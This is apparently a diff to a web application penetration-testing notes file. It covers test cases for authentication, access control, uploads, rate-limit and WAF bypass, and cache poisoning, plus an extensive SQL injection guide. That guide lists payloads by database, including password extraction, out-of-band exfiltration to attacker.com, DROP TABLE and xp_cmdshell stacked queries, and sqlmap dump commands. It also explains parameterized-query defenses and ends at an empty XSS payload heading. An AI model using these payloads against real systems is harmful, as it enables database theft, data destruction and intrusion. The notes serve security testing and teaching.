@@ -312,3 +312,694 @@ Web Application VAPT
     - Check for external numeric IP’s and resolve it
     - Test cloud storage
     - Check the existence of alternative channels (www.web.com vs m.web.com)
+- Capture request in burp -> Identify whitelisted domains in CSP -> Change host header to identified domain -> Resend request -> access unauth resources
+- detect cms/portal/content delivery/framework used -> refers docs / code -> map endpoints/api -> try to access/enumerate
+
+
+=> Authentication
+
+Test Cases:
+- Authentication & Credential Handling:
+	- Check for weak password policies (short, dictionary-based, missing complexity).
+	- Test for default / common credentials (admin/admin, test/test).
+	- Attempt brute force / credential stuffing -> verify rate limiting, captcha, account lockout.
+	- Check if session persists after password change / logout (session invalidation).
+	- Check for user enumeration via error messages (different response for valid vs invalid email).
+- OTP:
+	- Verify OTP is random, unpredictable, and not sequential.
+	- Test for reuse of OTP after successful login.
+	- Attempt to use expired OTP.
+	- Attempt brute force OTP (e.g., 000000–999999).
+	- Test rate limiting on OTP verification.
+	- Try replay attack (capture OTP request/response and resend).
+	- Verify OTP is not exposed in logs, response payload, or client-side code.
+	- Check if multiple OTPs issued invalidate old ones (to prevent parallel valid OTPs).
+- Session Management:
+	- Verify session cookie flags (HttpOnly, Secure, SameSite).
+	- Test for session fixation (inject old session ID).
+	- Check if session persists after logout / token invalidation.
+	- Attempt cookie replay (reuse session cookie in new browser/incognito).
+- Input Validation:
+	- Inject SQLi payloads in email & password fields.
+	- Inject XSS payloads in email field (stored/reflected).
+	- Try CRLF injection in login parameters.
+	- Test email field with special characters, long inputs, null bytes, Unicode.
+- Transport & Storage Security:
+	- Verify HTTPS enforced (no login over HTTP).
+	- Check for TLS version & weak ciphers.
+	- Ensure credentials are not in GET params / URL.
+- Business Logic Flaws:
+	- Try bypassing password with OTP (force direct OTP flow without request).
+	- Attempt login via API endpoint manipulation (e.g., skipping OTP verification).
+	- Verify if both login methods create the same privilege level (no privilege escalation).
+	- Test multi-session handling (login from multiple devices at once).
+
+BAC:
+- Insecure Direct Object References (IDOR): Attackers manipulate object identifiers (like user IDs or file names) in URLs or requests to access unauthorized resources.
+- Missing Role Checks: An endpoint may allow regular users to access admin-level functionality if it lacks server-side role validation.
+- Forced Browsing: Manually accessing unlinked or hidden endpoints not intended for the user.
+- Frontend-only Enforcement: Relying solely on client-side controls (like disabling buttons or hiding forms), which can be bypassed by sending raw HTTP requests.
+
+BAC Bypass & Exploitation Techniques:
+- Forced browsing i.e. direct access to hidden or sensitive endpoints like /admin or /config (URLs/Route)
+- Parameter Tampering: Modify hidden fields, cookies, or query parameters (URL, request or body params) to escalate access. (Example: Changing role=user to role=admin)
+- IDOR Exploitation: Guessing or modifying sequential or predictable IDs and Brute-forcing resource identifiers (userId=1, userId=2, etc.)
+- Access via Leaked Identifiers: Sensitive IDs exposed via JavaScript, error messages, or logs. (Example: Unpredictable IDs or GUIDs leaked in User reviews, Messages, URLs in JavaScript)
+- Skipping Workflow Steps: Accessing a final step directly (e.g., payment confirmation) without completing prerequisites.
+- HTTP Verb Tampering / Method Bypass: Changing request method (e.g., from GET to POST, or vice versa).
+- Header Manipulation: Adding headers like X-Original-URL, X-Forwarded-For, or X-HTTP-Method-Override to bypass access rules.
+- User-Agent / Referer Spoofing: Sometimes access is restricted based on these headers; spoofing can bypass weak controls.
+- Client-Side Only Validation: Using tools like Burp Suite to manipulate requests and bypass JavaScript-based checks.
+
+
+=> File Upload
+
+Test Cases:
+- File Type Validation:
+	- Try uploading non-image files (.exe, .php, .js, .sh).
+	- Upload with double extensions (evil.php.jpg, malware.png.php).
+	- Rename .exe -> .jpg and attempt upload (extension bypass).
+	- Change MIME type in request (Content-Type: image/png) while uploading another file type.
+	- Upload polyglot files (valid image + embedded script).
+- Size & Resource Handling:
+	- Upload oversized file beyond limit (DoS attempt).
+	- Upload 0-byte file.
+	- Upload extremely high-resolution image (e.g., 20000×20000 pixels) to check for processing crash.
+	- Perform concurrent uploads of large files -> test server stability.
+- Metadata & Content Injection:
+	- Inject malicious payloads in EXIF metadata (JS, SQL, HTML).
+	- Attempt stored XSS via filename (<script>alert(1)</script>.jpg).
+	- Upload with SQL injection payload in filename.
+	- Upload image with path traversal in filename (../../evil.php).
+- Storage & Access Control:
+	- Verify uploaded files are not stored in a web-accessible directory (/uploads/file.jpg accessible directly).
+	- Attempt IDOR: access another user’s uploaded image by changing file ID/path.
+	- Check if previously uploaded file can be overwritten by attacker.
+	- Test if uploaded files are served with Content-Disposition: attachment (to prevent inline execution).
+	- Check for X-Content-Type-Options: nosniff header to prevent MIME sniffing.
+- Execution & Malware:
+	- Upload script disguised as image and check if it executes (shell.php.jpg).
+	- Upload image with embedded PHP/JS and request it via direct URL.
+	- Upload known EICAR test file (to check AV/malware scanning).
+- Transport & Security Controls:
+	- Verify HTTPS enforced during upload.
+	- Intercept request -> try tampering multipart boundary in Burp.
+	- Test slow upload (Slowloris) to check server timeout.
+	- Test for lack of rate limiting in upload endpoint.
+- Business Logic:
+	- Check if attacker can bypass file upload restrictions via API calls (mobile app endpoints, hidden routes).
+	- Verify if image validation happens server-side (not just client-side).
+	- Test if multiple upload attempts invalidate old links.
+
+Ways of Injecting OS Commands:
+- Using shell metacharacters is a common method for performing OS command injection attacks. These characters act as command separators, allowing attackers to chain multiple commands together.
+- Command separators that work on both Windows and Unix-based systems:
+    - &
+    - &&
+    - |
+    - ||
+- Command separators that work only on Unix-based systems:
+    - ;
+    - Newline character (\n or 0x0A)
+- Inline command execution on Unix-based systems can be performed using:
+    - Backticks: `injected_command`
+    - Dollar-parentheses: $(injected_command)
+
+
+Rate Limit Bypass Techniques:
+- Multiple Accounts / API Keys:
+    - If rate limit is tied to a user account or API key, attackers just register many accounts or generate multiple API keys.
+- IP Rotation / Proxy Networks:
+    - If limit is based on IP, attackers use: VPNs, Tor, Botnets, Proxy lists (datacenter, residential), Each request appears from a different IP.
+- Changing Headers:
+    - Some systems check rate limit by headers like X-Forwarded-For, X-Real-IP.
+    - Attackers manipulate these headers to spoof different IPs.
+- Distributed Attacks:
+    - Attackers spread requests across multiple clients/devices (like credential stuffing using 1000 bots).
+    - Each client stays under the limit, but combined they overwhelm the app.
+- Parameter Manipulation:
+    - Sometimes apps enforce limits only on certain endpoints.
+    - Attackers tweak request parameters slightly (e.g., /?id=1 vs /?id=1&x=abc) so backend counts them as different requests.
+- Race Conditions:
+    - Send parallel/burst requests faster than the server can track.
+    - Example: server counts after processing, so 100 requests sent simultaneously may bypass a “5 per second” limit.
+- Session / Cookie Manipulation:
+    - If limit is tied to a session ID, attackers reset cookies or reinitialize sessions to evade limits.
+- Unprotected Alternative Endpoints:
+    - Rate limiting may apply on /api/v1/login but not on /api/v2/login or a mobile app API.
+    - Attackers find and exploit these “hidden” endpoints.
+
+Rate Limiting Checks:
+- When testing rate limiting, you usually verify:
+    - Scope of Enforcement
+    - Is the rate limit applied per IP address?
+    - Is it tied to a specific user account?
+    - Is it bound to a session/cookie?
+    - Or is it applied globally across all users?
+- Consistency Across Endpoints:
+    - Is rate limiting enforced uniformly on all APIs/endpoints?
+    - Are there unprotected or alternative endpoints (e.g., mobile APIs, v2 APIs)?
+- Bypass Possibilities:
+    - Can the limit be bypassed by sending parallel/burst requests (race condition)?
+    - Can it be bypassed by header spoofing (e.g., X-Forwarded-For, X-Real-IP)?
+    - Can it be bypassed using IP rotation, multiple accounts, or session resets?
+
+
+================================================================================
+
+SQL INJECTION (SQLI)
+
+================================================================================
+
+1. WHAT IS SQL INJECTION
+
+- SQL Injection (SQLi) is a web security vulnerability in which an attacker exploits flaws in an application by injecting malicious SQL (Structured Query Language) code into input fields.
+- This can allow the attacker to interfere with the application's database queries, enabling unauthorized access to view, modify, or delete sensitive data.
+- SQL Injection occurs when user input is not properly validated or sanitized and is directly inserted into a SQL query.
+- Since most web applications interact with databases using SQL, improperly handled input can allow attackers to craft malicious input that alters the intended structure and behavior of the query.
+
+Why SQL Injection Happens:
+
+- Lack of input validation: user inputs are directly used in SQL queries without sanitization.
+- Dynamic SQL queries: constructing SQL strings manually based on user input.
+- Improper use of APIs: not using parameterized queries or ORM methods properly.
+- Lack of awareness or security practices: developers not following secure coding standards.
+
+Potential Impact of SQL Injection:
+
+- Bypass authentication mechanisms
+- View sensitive data (usernames, passwords, personal information)
+- Modify or delete database records
+- Execute administrative operations on the database
+- Extract entire databases
+- In severe cases, gain control of the underlying server or system
+
+================================================================================
+
+2. TYPES OF SQL INJECTION
+
+2.1 In-Band SQLi (Classic)
+
+The attacker injects SQL and immediately sees results in the application's response.
+
+- Error-Based SQLi: The attacker causes database errors to gain information from error messages. For example, injecting ' UNION SELECT NULL, version() -- reveals the database version through an error.
+
+- Union-Based SQLi: The attacker uses the SQL UNION operator to combine results from the original query with malicious query results, retrieving data directly. For example, ' UNION SELECT username, password FROM users -- appends user data to the query output.
+
+2.2 Blind SQLi
+
+No direct output; the attacker infers data by observing application behavior.
+
+- Boolean-Based Blind SQLi: Uses conditional queries that cause different responses based on true/false evaluation. For example, username = 'admin' AND 1=1 returns a normal page, while username = 'admin' AND 1=0 causes an error or different behavior.
+
+- Time-Based Blind SQLi: Uses delays to determine if conditions are true by measuring server response times. For example, a query causes a 5-second delay if the first password character is 'a'.
+
+2.3 Out-of-Band (OOB) SQLi
+
+When direct or blind injection is not possible, the attacker uses external channels like DNS or HTTP requests to receive data. For example, the database triggers a DNS lookup to the attacker's server, leaking data externally.
+
+2.4 Second-Order SQLi
+
+The payload is stored (e.g., via registration or profile update) and later executed when the stored data is used in another SQL query. Example: register username "admin'-- -", then later an administrator views the user list and the payload triggers.
+
+================================================================================
+
+3. DETECTING SQL INJECTION VULNERABILITIES
+
+You can detect SQL injection manually using a systematic set of tests against every entry point in the application. Entry points include:
+
+- URL parameters (e.g., ?id=1, ?page=2)
+- POST data (forms, login, search)
+- HTTP headers (User-Agent, Referer, Cookie, X-Forwarded-For)
+- JSON or XML fields
+
+Manual Testing Steps:
+
+3.1 Initial Detection
+
+- Submit the single quote character ' and look for errors or other anomalies.
+- Submit SQL-specific syntax that evaluates to the base (original) value and to a different value, looking for systematic differences. Example: AND 1=1 vs AND 1=2.
+- Submit boolean conditions such as OR 1=1 and OR 1=2.
+- Submit payloads designed to trigger time delays when executed within a SQL query (e.g., SLEEP(5) or WAITFOR DELAY).
+- Submit OAST payloads designed to trigger an out-of-band network interaction (DNS/HTTP) and monitor for interactions.
+
+3.2 Specific Manual Tests
+
+- Single quote test: http://example.com/page?id=1' -> if error message appears (e.g., "You have an error in your SQL syntax"), likely vulnerable.
+- Logic test: http://example.com/page?id=1 AND 1=1 -> normal response; http://example.com/page?id=1 AND 1=2 -> different response (blank page, missing content, redirect). If responses differ, parameter is injectable.
+- Comment test: http://example.com/page?id=1' -- - (space after --). If page loads without errors, original query was altered.
+
+3.3 Determine Injection Type
+
+- If error messages reveal data: Error-based.
+- If UNION SELECT works and output is visible: Union-based.
+- If page changes based on true/false conditions but no data output: Boolean-based blind.
+- If response time changes with SLEEP() functions: Time-based blind.
+- If you can trigger DNS/HTTP requests: Out-of-band.
+
+3.4 Automated Tool Testing
+
+SQLMap (Most Common)
+
+- Basic scan: sqlmap -u "http://example.com/page?id=1" --batch
+- Enumerate databases: sqlmap -u "http://example.com/page?id=1" --dbs
+- Enumerate tables (from a specific database): sqlmap -u "http://example.com/page?id=1" -D database_name --tables
+- Enumerate columns: sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --columns
+- Dump data: sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name -C column1,column2 --dump
+- POST data: sqlmap -u "http://example.com/login" --data="user=admin&pass=123" --dump
+- Advanced options: --level=5 (increase depth), --risk=3 (include aggressive payloads), --os-shell (attempt OS command execution)
+
+Other Tools: Burp Suite (Intruder, Scanner), OWASP ZAP (active scanner), jSQL Injection (GUI).
+
+================================================================================
+
+4. EXPLOITATION STEPS (IF VULNERABLE)
+
+Once a vulnerability is confirmed, follow this structured process.
+
+4.1 Determine Database Type
+
+Different databases have different syntax. Clues from error messages or version functions:
+
+- MySQL: VERSION(), @@version
+- MSSQL: @@VERSION
+- PostgreSQL: version()
+- Oracle: SELECT banner FROM v$version
+
+4.2 Determine Number of Columns (for Union-based)
+
+- Use ORDER BY: ' ORDER BY 1-- -, ' ORDER BY 2-- -, increase until error. The last valid number is the column count.
+- Or use UNION SELECT NULL, NULL, ... until no error.
+
+4.3 Find Columns with String Data Type (Union-based)
+
+Submit a series of UNION SELECT payloads placing a string value into each column in turn. For example, if four columns:
+
+' UNION SELECT 'a',NULL,NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL,NULL-- -
+' UNION SELECT NULL,NULL,'a',NULL-- -
+' UNION SELECT NULL,NULL,NULL,'a'-- -
+
+4.4 Enumerate Database Schema
+
+- List databases (MySQL): ' UNION SELECT schema_name FROM information_schema.schemata -- -
+- List tables: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name' -- -
+- List columns: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -
+
+4.5 Extract Data
+
+- Union-based: ' UNION SELECT username, password FROM users -- -
+- Combine multiple values in one column: ' UNION SELECT username || '~' || password FROM users -- -
+
+4.6 Blind SQL Injection Exploitation
+
+Boolean-based blind: Use conditional queries that change the page response.
+
+- Confirm table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a
+- Confirm user exists: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+- Determine password length: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a (iterate length until false)
+- Extract character by character: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a (use Burp Intruder to brute force each position)
+
+Time-based blind: Use delays to infer conditions.
+
+- MySQL: ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
+- MSSQL: '; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:5'-- -
+- PostgreSQL: ' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' THEN pg_sleep(5) ELSE 0 END-- -
+- Oracle: ' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN dbms_pipe.receive_message('x',5) ELSE NULL END FROM users WHERE username='administrator') IS NULL-- -
+
+Error-based blind (conditional errors): Use CASE to cause division by zero.
+
+- xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a (error, condition true)
+- xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a (no error, false)
+- Extract data via CAST(): ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- - (error leaks username)
+
+Out-of-band (OOB) exfiltration:
+
+- MySQL: ' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
+- MSSQL: '; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -
+- Oracle: ' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
+- PostgreSQL: ' AND (SELECT copy((SELECT current_database()) to '/tmp/x')) IS NULL-- - (requires file permissions)
+
+4.7 Stacked Queries (Execute multiple statements)
+
+'; DROP TABLE users-- -
+'; EXEC xp_cmdshell 'dir'-- - (MSSQL)
+'; INSERT INTO users VALUES('hacker','pass')-- - (if INSERT allowed)
+
+================================================================================
+
+5. SQL INJECTION PAYLOADS (BY TYPE)
+
+5.1 Error-Based Payloads
+
+' (single quote) triggers syntax error.
+
+' AND extractvalue(1,concat(0x7e,database()))-- - (MySQL) reveals database name in error.
+
+' AND updatexml(1,concat(0x7e,version()),1)-- - (MySQL) reveals version.
+
+' AND 1=convert(int,@@version)-- - (MSSQL) reveals SQL Server version.
+
+' AND 1=cast(version() as int)-- - (PostgreSQL) reveals version.
+
+' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- - (Oracle) reveals banner.
+
+5.2 Union-Based Payloads
+
+Determine column count: ' ORDER BY 1-- - ... ' ORDER BY N-- - until error.
+
+' UNION SELECT NULL, NULL, NULL-- - (adjust number of NULLs until no error).
+
+' UNION SELECT 1,2,3-- - (replace NULLs with numbers to see which columns are displayed).
+
+' UNION SELECT 1,2,database()-- - (retrieve database name).
+
+' UNION SELECT 1,2,table_name FROM information_schema.tables-- -
+
+' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -
+
+' UNION SELECT username, password FROM users-- -
+
+' UNION SELECT username || '~' || password FROM users-- - (combine multiple values in one column).
+
+5.3 Boolean-Based Blind Payloads
+
+' AND 1=1-- - (true condition, normal page)
+
+' AND 1=2-- - (false condition, page may be empty or different)
+
+' AND SUBSTRING(database(),1,1)='a'-- - (check first character of database name)
+
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1-- - (extract password characters)
+
+5.4 Time-Based Blind Payloads
+
+MySQL: ' AND IF(1=1, SLEEP(5), 0)-- - (delay 5 seconds)
+
+MySQL with condition: ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
+
+MSSQL: '; WAITFOR DELAY '0:0:5'-- -
+
+MSSQL with condition: '; IF (SELECT SUBSTRING(db_name(),1,1))='a' WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'-- -
+
+PostgreSQL: ' AND (SELECT pg_sleep(5))-- -
+
+PostgreSQL with condition: ' AND CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) ELSE 0 END-- -
+
+Oracle: ' AND (SELECT dbms_pipe.receive_message('x',5) FROM dual) IS NULL-- -
+
+5.5 Out-of-Band Payloads
+
+MySQL: ' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
+
+MSSQL: '; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -
+
+Oracle: ' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
+
+PostgreSQL: ' AND (SELECT copy((SELECT current_database()) to '/tmp/x')) IS NULL-- - (requires file permissions)
+
+5.6 Stacked Queries Payloads
+
+MySQL: '; DROP TABLE users-- -
+
+MySQL: '; SELECT * FROM users INTO OUTFILE '/tmp/out.txt'-- -
+
+MSSQL: '; EXEC xp_cmdshell 'dir'-- -
+
+PostgreSQL: '; CREATE TABLE test (id int);-- -
+
+Oracle: '; BEGIN DBMS_OUTPUT.PUT_LINE('test'); END;-- -
+
+5.7 WAF Bypass and Encoding Variations
+
+- URL encoding: %27%20AND%201%3D1--%20-
+- Double URL encoding: %2527%2520AND%25201%253D1--%2520-
+- Case variation: ' aNd 1=1-- -
+- Comments: '/**/AND/**/1=1-- -
+- Inline MySQL comments: '/*!50000AND*/ 1=1-- -
+- Hex encoding: 0x2720414e4420313d31 (which is ' AND 1=1)
+- Concatenation: ' AND 'a'='a'
+
+5.8 Basic Detection Payloads
+
+- Skipping further query by commenting: Abcd'--
+- Skipping all conditions: Abcd'+OR+1=1--
+- Bypass login with username: user'--
+
+================================================================================
+
+6. SQL INJECTION IN DIFFERENT PARTS OF THE QUERY
+
+Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query.
+
+- In UPDATE statements, within the updated values or the WHERE clause.
+- In INSERT statements, within the inserted values.
+- In SELECT statements, within the table or column name (rare, requires whitelist bypass).
+- In SELECT statements, within the ORDER BY clause (e.g., ?sort=price').
+
+================================================================================
+
+7. PARAMETERIZED QUERIES / PREPARED STATEMENTS (THE MAIN DEFENSE)
+
+What are Parameterized Queries?
+
+Parameterized queries (also called prepared statements) are a coding technique that separates SQL logic from the data being passed to the database. Instead of building a SQL query by concatenating user input into a string, you define the query with placeholders (parameters), then supply the data separately. The database treats the parameters as data only, never as executable code.
+
+How It Works:
+
+1. Prepare: The database receives the SQL statement with placeholders (e.g., ? or :name). It parses, compiles, and optimizes the query structure once.
+
+2. Execute: The application sends the actual values (parameters) to the database. The database plugs them into the prepared query without re-interpreting them as SQL.
+
+Because the query structure is fixed before the parameters arrive, any malicious input (like ' OR '1'='1) cannot change the intended SQL logic. It is treated as a literal string value.
+
+Examples:
+
+PHP (PDO) - Unsafe: $stmt = $pdo->query("SELECT * FROM users WHERE username = '$user'");
+PHP (PDO) - Safe (parameterized): $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $_POST['username']]);
+
+Python (psycopg2) - Unsafe: cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
+Python - Safe: cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+Java (JDBC) - Unsafe: Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE username = '" + username + "'");
+Java - Safe: PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?"); pstmt.setString(1, username); ResultSet rs = pstmt.executeQuery();
+
+Why It Prevents SQL Injection:
+
+- Separation of code and data: The database engine knows the structure (e.g., WHERE username = ?) is fixed. The parameter is bound as a value, not as part of the SQL statement.
+- Automatic escaping: The database driver handles escaping internally, but more importantly, the parameter never becomes executable SQL.
+- No risk of quote manipulation: Even if the input contains SQL syntax, it is sent as raw data (e.g., a string containing ' OR '1'='1 will be interpreted as that exact string, not as a SQL condition).
+
+Common Misconceptions:
+
+- Escaping is not the same as parameterization. Functions like mysqli_real_escape_string() only sanitize strings; they do not prevent injection in other parts of the query (e.g., table names, ORDER BY columns). Parameterized queries protect all data values.
+- Stored procedures can still be vulnerable if you build dynamic SQL inside them using string concatenation. Parameterized calls to stored procedures are safe.
+- Many ORMs (like Hibernate, Entity Framework) use parameterized queries under the hood, but only if you use their safe APIs (not concatenating raw SQL).
+
+Best Practices:
+
+- Use parameterized queries for all user-supplied data, including data from cookies, headers, and hidden form fields.
+- For dynamic identifiers (table/column names), use whitelisting - never accept raw user input for these.
+- Combine with least privilege: the database account used by the application should only have necessary permissions (e.g., SELECT on specific tables, no DROP).
+
+================================================================================
+
+8. MITIGATION AND PREVENTION
+
+Primary Defenses:
+
+- Use Prepared Statements (Parameterized Queries): Ensures user input is treated as data, not code. This is the most reliable defense.
+- Use ORM (Object Relational Mapping) Tools: Tools like Sequelize, Django ORM, Hibernate manage SQL safely and often use parameterization automatically.
+- Input Validation and Sanitization: Validate and sanitize all inputs through input validation and escaping. Whitelist input validation: only allow expected characters and patterns (e.g., for email, phone numbers).
+- Escape User Input Carefully: If you must use dynamic SQL (not recommended over parameterized queries), escape input correctly using database-specific escaping functions (e.g., mysqli_real_escape_string). However, parameterized queries are strongly preferred.
+
+Additional Protections:
+
+- Limit Database Privileges (Principle of Least Privilege): The application's database user should have only necessary permissions (e.g., read-only where needed). Do not use a database administrator account for the web application.
+- Proper Error Handling: Do not expose database errors to users. Disable detailed DB error messages in production. Use custom error pages.
+- Use Web Application Firewalls (WAFs): Can block known attack signatures and patterns, providing an additional layer of defense.
+- Regular Security Testing: Perform vulnerability scans, code audits, and penetration tests. Use both manual and automated testing (e.g., SQLMap, Burp Suite) to identify and fix SQLi flaws.
+
+================================================================================
+
+9. COMPLETE TESTING WORKFLOW (SUMMARY)
+
+Step 1: Identify all input vectors - GET parameters, POST data, HTTP headers, cookies, JSON/XML fields.
+
+Step 2: Submit a single quote ' and observe errors or anomalies.
+
+Step 3: Test boolean conditions: AND 1=1 vs AND 1=2, look for differences in responses.
+
+Step 4: Introduce time delays (e.g., SLEEP(5)) to detect time-based blind injection.
+
+Step 5: Submit OAST payloads (e.g., DNS lookup) to detect out-of-band injection.
+
+Step 6: Determine injection type based on responses: error-based, union-based, boolean-based blind, time-based blind, or OOB.
+
+Step 7: If union-based, determine number of columns using ORDER BY or UNION SELECT NULL.
+
+Step 8: Find columns with string data type by injecting 'a' into each column.
+
+Step 9: Enumerate database schema: list databases, tables, columns using information_schema (or equivalent).
+
+Step 10: Extract data from interesting tables (e.g., users, passwords).
+
+Step 11: For blind SQLi, use conditional queries (boolean or time) to extract data character by character.
+
+Step 12: Use SQLMap for automated enumeration and data extraction (if permitted).
+
+Step 13: Document findings, including vulnerable parameters, injection type, extracted data, and remediation recommendations.
+
+Step 14: Report to development team with fixes: parameterized queries, input validation, least privilege, error handling.
+
+WAF Bypass Techniques:
+- Encoding / Obfuscation:
+    - Working:
+        - Firewalls and WAFs often rely on rules/signatures (like regex patterns) to detect attacks (SQLi, XSS, etc.).
+        - If an attacker encodes the payload differently, the firewall may not recognize it.
+        - The backend server decodes the payload automatically -> malicious input executes.
+        - Examples of Encoding for Bypass: URL encoding, double encoding, Unicode tricks, Base64, HTML entities.
+    - URL Encoding:
+        - Attack: GET /search?q=<script>alert(1)</script>
+        - WAF might block this because it matches <script>.
+        - Encoded: GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+            - %3C = <
+            - %3E = >
+            - %2F = /
+        - If the firewall doesn’t normalize the request first, it misses the XSS, but the server decodes it back.
+    - Double URL Encoding:
+        - Normal encoding: ' = %27
+        - Double-encoded: %2527
+        - First decode -> %27
+        - Second decode -> '
+        - If WAF only decodes once, the payload slips through.
+    - Base64 Encoding:
+        - Some backends accept Base64-encoded parameters (like in APIs).
+        - Attack: admin' OR '1'='1
+        - Base64 encoded:
+            YWRtaW4nIE9SI
+            CcxJz0nMQ==
+        - WAF might ignore it, backend decodes and executes SQL injection.
+    - HTML Encoding:
+        - <script> -> &lt;script&gt;
+        - If the WAF only blocks <script> but not its encoded form, bypass works.
+- Case Manipulation & Keyword Splitting:
+    - Many filters are case-sensitive.
+    - Example:
+        - UNION SELECT -> uNiOn SeLeCt
+        - se/**/lect (using comments to split).
+- HTTP Parameter Pollution (HPP):
+    - Sending the same parameter twice may confuse firewall vs. backend.
+    - Example: ?id=1&id=2
+    - Firewall may parse id=1, backend uses id=2.
+- Overlong UTF-8 / Unicode Tricks:
+    - Some systems accept alternative byte encodings.
+    - Example: /etc/passwd -> /%2565tc/passwd (double-encoded).
+- Path Traversal Tricks:
+    - Using different slashes or encodings.
+    - Example:
+        - ../../etc/passwd
+        - ..%2F..%2Fetc/passwd
+        - ..\\..\\etc\\passwd
+- Request Smuggling / Desync:
+    - Different devices (proxy vs firewall vs server) parse HTTP headers differently.
+    - Attacker exploits this mismatch to slip malicious payloads through.
+- Using Allowed Protocols / Ports:
+    - Firewalls usually allow HTTP (80) and HTTPS (443).
+    - Attackers tunnel other protocols inside them (SSH over HTTPS, DNS tunneling).
+- Fragmentation & Evasion:
+    - Splitting payloads across multiple packets.
+    - Some firewalls don’t reassemble before inspection.
+    - Example: <scri + pt> split across TCP fragments.
+- Host Header Manipulation:
+    - Some WAFs use Host header for filtering.
+    - Changing it (X-Forwarded-Host) can confuse backend vs firewall.
+- Using Alternate HTTP Methods:
+    - Firewalls may only filter GET/POST but forget others (PUT, DELETE, OPTIONS, PATCH).
+    - Attack via overlooked methods.
+- Misconfigurations:
+    - “Allow all outbound traffic” rules.
+    - Forgotten debug endpoints bypass filtering.
+    - Whitelisted IPs abused by attackers.
+
+Techniques and variations of Web Cache Poisoning:
+- Web Cache Poisoning involves manipulating how a caching system (like a reverse proxy, CDN, or browser cache) stores and serves content, so that subsequent users receive a malicious or altered response instead of the intended one.
+- Header-Based Poisoning:
+    - Manipulating request headers that the cache uses to differentiate between responses.
+    - Host Header Injection: Changing the Host header to poison a cached response: Host: attacker.com
+    - These headers are often trusted by web apps and backends but not understood by caching layers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL
+    - Example Attack:
+        GET / HTTP/1.1
+        Host: victim.com
+        X-Forwarded-Host: attacker.com
+- Query Parameter Pollution:
+    - Injecting unexpected or non-standard parameters into the URL, which the application uses but the cache ignores.
+    - Cache Key Ignorance:
+        - /product?id=123&lang=en -> Cache Key
+        - /product?id=123&lang=en&evil=1 -> evil=1 ignored by cache, but app reacts
+    - The server includes content based on evil=1, but the cache sees it as identical to the normal request and stores the poisoned version.
+- HTTP Method Confusion:
+    - Some cache systems cache GET requests but ignore POST/PUT, while the backend treats them differently.
+    - Attacker sends a GET with malicious data in headers/query.
+    - App uses data from header but cache key doesn’t include it -> poisoned response stored.
+- Unkeyed Input Poisoning:
+    - Occurs when the cache does not consider certain parts of the request (like cookies or headers) in its caching logic, but the backend does.
+    - Example: Backend renders different content for authenticated users using a Cookie, but cache ignores the Cookie.
+- Variation Header Manipulation:
+    - The Vary response header tells caches which headers affect the cache key.
+    - If misconfigured or incomplete: The app varies based on User-Agent, but Vary doesn’t include it -> cache confusion and poisoning.
+- Encoding Tricks:
+    - Using double-encoding or unusual characters to bypass filters or trick cache/backend into interpreting content differently.
+    - E.g.: /%2e%2e/admin -> interpreted as /../admin
+    - Cache may treat it as static content, backend may resolve it to admin panel.
+- Cookie Bombing:
+    - If the application uses cookies in a way that affects the response, but the cache ignores them, it can be poisoned.
+    - Send requests with different cookies to store multiple variants in cache, potentially evicting useful ones or planting malicious ones.
+- Cache-Control Header Abuse:
+    - Altering or misusing cache directives.
+    - For example:
+        - Setting Cache-Control: public, max-age=600 on a sensitive response.
+        - Causing sensitive data to be cached and served to other users.
+- Bypass 404 or Error Pages:
+    - Trick server into generating a valid page with a malicious payload that gets cached instead of showing a 404 or error.
+- Open Redirect or SSRF Poisoning:
+    - Poisoning the cache via redirection-based payloads (especially if the redirection response itself is cached).
+
+
+Test/Check:
+- Reflected:
+    - Test every entry point: submit random alphanumeric values, determine the reflection context
+    - Study JS, jQuery code by inspecting and Check for input validation and sanitization
+    - Use line and string breaks with comments, close previous tags/query
+    - HTML encoding, URL encoding, string replace/split for obfuscation
+    - Burp Intruder with testing all allowed tags and events
+    - Payloads:
